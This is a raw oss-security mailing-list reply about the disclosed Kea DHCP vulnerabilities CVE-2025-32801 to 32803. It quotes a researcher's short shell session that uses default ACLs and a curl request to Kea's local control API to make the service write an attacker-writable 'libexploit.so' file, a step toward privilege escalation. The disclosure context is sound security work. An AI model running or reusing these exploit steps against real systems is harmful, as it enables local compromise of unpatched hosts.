Received: (qmail 7812 invoked by uid 550); 30 May 2025 08:12:03 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 7794 invoked from network); 30 May 2025 08:12:03 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1748592712; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
	b=pVULYuYolz/i+kPFbb4O6Zoku/vzNIAejMXvFEbDpfAnNG9YwOJ5MkEBfuciRD5+4Ur5sF
	FZSOSPdfKlm+IRQqwXvuVdjTADjN+FQ350CzKJTXwRJnDW3DmWuqbvoN6deM9JswMyX96a
	cainBkmr8P2pzxO30YEZJUoqUxyrs60=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1748592712;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
	b=JmTvwlQnAjmvRNMxCUtHcWwKVQO8QmI5+N8n3sqI/kIoLbZog4TJuo7WP2U+Rs1MeVEdmd
	PFBlrTayo3BNYSCw==
Authentication-Results: smtp-out2.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1748592712; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
	b=pVULYuYolz/i+kPFbb4O6Zoku/vzNIAejMXvFEbDpfAnNG9YwOJ5MkEBfuciRD5+4Ur5sF
	FZSOSPdfKlm+IRQqwXvuVdjTADjN+FQ350CzKJTXwRJnDW3DmWuqbvoN6deM9JswMyX96a
	cainBkmr8P2pzxO30YEZJUoqUxyrs60=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1748592712;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
	b=JmTvwlQnAjmvRNMxCUtHcWwKVQO8QmI5+N8n3sqI/kIoLbZog4TJuo7WP2U+Rs1MeVEdmd
	PFBlrTayo3BNYSCw==
Date: Fri, 30 May 2025 10:11:51 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <aDloR_R9LjYpBB28@kasco.suse.de>
References: <2f8f64a2-118d-458e-9f1a-182d4d88ad17@isc.org>
 <aDdGEfMxLaRJzSK9@kasco.suse.de>
 <20250528182325.yuupynsufybqvea3@jwilk.net>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="kWcRLGka4QwYZNRp"
Content-Disposition: inline
In-Reply-To: <20250528182325.yuupynsufybqvea3@jwilk.net>
Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
 (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)

--kWcRLGka4QwYZNRp
Content-Type: text/plain; protected-headers=v1; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
Date: Fri, 30 May 2025 10:11:51 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
 (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)

Hi,

On Wed, May 28, 2025 at 08:23:25PM +0200, Jakub Wilk wrote:
> * Matthias Gerstner <mgerstner@suse.de>, 2025-05-28 19:21:
> >By leveraging issue 3.2), the Kea services can be instructed to create=20
> >`_kea` owned files in the attacker's `$HOME/.Private`. The content of=20
> >the created files is not fully attacker controlled, however, so it will=
=20
> >not be possible to craft a valid ELF object for loading via `dlopen()`=20
> >this way. By placing a setgid-directory in `$HOME/.Private/evil-dir`,=20
> >any files created in this directory will even have the group-ownership=20
> >of the attacker. The file mode will be 0644, however,
>=20
> Default ACLs to the rescue!
>=20
> $ chmod a+x ~
> $ mkdir -m 777 ~/.Private
> $ setfacl -d -m u:$LOGNAME:rwx ~/.Private/
> $ curl -s -H "Content-Type: application/json" -d '{ "command": "config-wr=
ite", "arguments": { "filename": "'"$HOME"'/.Private/libexploit.so" } }' lo=
calhost:8000 > /dev/null
> $ echo pwned > ~/.Private/libexploit.so
> $ ls -l ~/.Private/libexploit.so
> -rw-rw-rw-+ 1 _kea _kea 6 May 28 18:15 /home/jwilk/.Private/libexploit.so
> $ cat ~/.Private/libexploit.so
> pwned

very nice addition! We already felt like there was little left to
succeed in the attack, but didn't think of ACLs.

We will make an update to our blog post to reflect this.

Cheers

Matthias

--kWcRLGka4QwYZNRp
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmg5aEcACgkQFMQFyXGS
NVMJ4Q/6A2SCjmKOoCVBPUC6Fik7JagfbsOp7WZKXnR1VX727YeqsVigSVm6vH0A
VpqH36ar9Yw6q3sLymxkHNn+A/X/UMGMnA5025JnpoaIqU1r/jwz4BltYywBo0Th
qitNIEioRh97d3hXqR2LXm+5ZOzMk+AqINtUQXDcxpzLHOmCP5SdWBeS9kivoRn6
hWaoNanI1SAoEAud5/8Lhk98WKRr0i22XeUVFDiWV0VU31s59uvqeRycyp0pqE8h
S3lizQuN4rfSx3rR3YMWx4V0NxGqYZX5e7MQga3Q62qEUdpo1JlOsv0frM2vEcDH
oK+4ObKEjIX/O97vJPY/TE8kcKb1NFwTGfSc7OPM5nAdUH9hZKEeprX4tubtBSva
WcaiMqDdpJcYrJTBMWxy27++PN7NuBXROqrco87+rssJ9bCem+fF8vJ0P6riJhwN
X2ZvbTAC45JZ5kztiFl7VU3shI0E/I2U3oSnpUmKpP5vJHSrproDkbczJg2+zWOP
T9GBqCiSOoLbAxz1M5H5euYs5Ezk+RrbbO3CCWuKXpXm6U9S24ZD/ZCnkEvZti5C
EXObZq1XHk8ckMubofr0hWvJCw8wAZxOs4dnrtQsBnwYPpjZD/af80ZuB3KtBZQY
GbjXyXaIDfglvsda27HhppbJOOxAFigaRL5GmNNBz2S8sDMfJ+A=
=B799
-----END PGP SIGNATURE-----

--kWcRLGka4QwYZNRp--
